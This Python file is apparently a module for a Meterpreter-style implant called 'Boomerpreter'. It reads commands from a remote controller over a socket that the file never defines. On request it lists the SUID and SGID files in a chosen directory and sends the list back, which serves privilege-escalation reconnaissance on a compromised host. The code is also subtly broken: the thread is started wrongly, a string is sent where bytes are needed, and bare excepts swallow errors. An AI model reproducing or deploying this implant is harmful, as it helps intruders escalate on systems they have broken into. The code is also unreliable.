import subprocess
import socket
from platform import python_version
import glob
import stat
import os
from threading import Thread


class Boomerpreter:
    def __init__(self,s):
        self.socket = s
        self.options = {
        "suid_sgid": ["get_suid_sgid", True]
        }

    def run(self):
        while True:
            data_rcv = self.socket.recv(1024)
            if python_version().startswith("3"):
                data_rcv = data_rcv.decode()
            data_rcv = data_rcv.split()
            try:
                opt = self.options[data_rcv[0]]
                if opt:
                    if opt[1]:
                        if len(data_rcv) > 1:
                            data = getattr(self, opt[0])(data_rcv[1])
                        else:
                            data = b"Error"
                    else:
                        data = getattr(self, opt[0])()
            except:
                data = b"Error"
            self.socket.send(data)

    def get_suid_sgid(self, request):
        my_dir = request
        files_suid = []
        files_sgid = []
        for f in os.listdir(my_dir):
            aux_file = os.path.join(my_dir, f)
            if os.path.isfile(aux_file):
                result = self.is_suid_sgid(aux_file)
                if result[0]:
                    files_suid.append(result[0])
                if result[1]:
                    files_sgid.append(result[1])
        files_suid = ";".join(files_suid)
        files_sgid = ";".join(files_sgid)
        files = files_suid + "++" + files_sgid
        response = files
        return response

    def is_suid_sgid(self, file_name):
        results = []
        try:
            f = os.stat(file_name)
            mode = f.st_mode
        except:
            return [None, None]
        if (mode & stat.S_ISUID) == 2048:
            results.append(file_name)
        else:
            results.append(None)
        if (mode & stat.S_ISGID) == 1024:
            results.append(file_name)
        else:
            results.append(None)
        return results

try: 
    boomerpreter = Boomerpreter(s)
    t = Thread(target=boomerpreter.run())
    t.setDaemon = True
    t.start()
except:
    pass